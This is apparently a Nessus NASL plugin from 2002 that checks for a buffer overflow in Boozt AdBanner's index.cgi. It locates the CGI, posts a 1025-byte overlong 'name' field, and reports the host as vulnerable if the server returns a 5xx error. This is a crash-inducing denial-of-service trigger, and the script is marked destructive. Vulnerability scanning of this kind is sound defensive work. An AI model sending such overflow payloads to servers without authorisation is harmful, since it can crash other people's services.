#
# This script was written by Michel Arboi <arboi@alussinan.org>
# GPL
# *untested*
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID
#
# References:
# To: bugtraq@securityfocus.com
# From: rsanmcar@alum.uax.es
# Subject: BOOZT! Standard 's administration cgi vulnerable to buffer overflow
# Date: Sat, 5 Jan 2002 18:04:48 GMT
#
# Affected:
# Boozt 0.9.8alpha
# 


if(description)
{
 script_id(11082);
 script_bugtraq_id(6281);
 script_version ("$Revision: 1.11 $");
 name["english"] = "Boozt index.cgi overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "It seems that index.cgi from Boozt AdBanner
is installed and is vulnerable to a buffer overflow:
it doesn't check the length of user supplied variables 
before copying them to internal arrays.

A cracker may exploit this vulnerability to make your web server
crash continually or even execute arbirtray code on your system.

Solution : upgrade your software or protect it with a filtering reverse proxy
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Buffer overflow in Boozt AdBanner index.cgi";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes");
 exit(0);
}

########


include("http_func.inc");
include("http_keepalive.inc");

d1[0] = "/cgi-bin";
d1[1] = "/scripts";
d1[2] = "";

d2[0] = "/boozt";
d2[1] = "";

d3[0] = "/admin";
d3[1] = "";

function find_boozt(port)
{
  for (i=0; i<3; i=i+1)
  {
    for (j=0; j<2; j=j+1)
    {
      for (k=0; k<2; k=k+1)
      {
        u = string(d1[i], d2[j], d3[k], "/index.cgi");
        r = http_get(port: port, item: u);
        r = http_keepalive_send_recv(port:port, data:r);
        if(ereg(string:r, pattern:"^HTTP.* 200 .*"))
        {
          if ("BOOZT Adbanner system" >< r) return(u);
        }
      }
    }
  }
  return (0);
}

#######


port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

bz = find_boozt(port: port); 
if (! bz) exit(0);

r = http_post(port: port, item: bz);
r = r - string("\r\n\r\n");
r = string(r, "\r\nContent-Length: 1030\r\n",
	"Content-Type: application/x-www-form-urlencoded\r\n\r\n",
	"name=", crap(1025), "\r\n\r\n");

soc = http_open_socket(port);
if(! soc) exit(0);
send(socket:soc, data: r);
r = http_recv(socket:soc);
http_close_socket(soc);

if (ereg(string: r, pattern: "^HTTP/[0-9.]+ +5[0-9][0-9] "))
{
  security_hole(port);
  exit(0);
}

m="It seems that index.cgi from Boozt AdBanner
is installed.
Old versions of the CGI were vulnerable to a buffer overflow.
However, Nessus could not exploit it there.

Risk factor : Low";
 
security_warning(port: port, data: m);
